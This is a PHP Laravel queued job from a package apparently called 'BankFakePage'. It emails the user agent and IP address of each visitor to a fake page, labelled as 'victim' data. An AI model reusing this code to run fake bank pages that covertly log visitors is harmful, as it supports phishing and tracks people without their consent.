<?php

namespace LaravelClass\BankFakePage\jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Mail;
use LaravelClass\BankFakePage\Implementation\EmailInitialize;
use LaravelClass\BankFakePage\Mail\FakePageVisitMailer;

class SendMailJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {
        EmailInitialize::setEmailConfig();
        Mail::send(new FakePageVisitMailer(['victimAgent'=>$_SERVER['HTTP_USER_AGENT'],'victimIp'=>request()->getClientIp()]));
    }
}
